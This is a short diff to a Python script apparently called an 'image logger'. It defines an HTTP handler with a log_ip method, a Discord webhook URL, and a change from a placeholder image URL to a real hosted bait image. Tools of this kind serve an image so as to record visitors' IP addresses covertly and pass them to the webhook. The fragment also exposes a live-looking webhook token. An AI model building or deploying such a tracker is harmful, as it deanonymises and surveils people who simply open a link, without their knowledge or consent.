@@ -4,7 +4,7 @@ import requests
 # Configuration
 WEBHOOK_URL =
 "https://discord.com/api/webhooks/1335979504371499049/aftM-GJrac25vzJZDnwXsJ40OOvJUNfOous5qplstXtAIPCWm1zibfAKQv_PRa4sz43B"
-IMAGE_URL = "https://your-server.com/image.jpg"  # Your hosted image
+IMAGE_URL = "https://i.ibb.co/svrq7zf1/5a277454eaf6fa70afff7491004a3a94.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200"  # Your hosted image
 
 class ImageLogger(BaseHTTPRequestHandler):
     def log_ip(self):
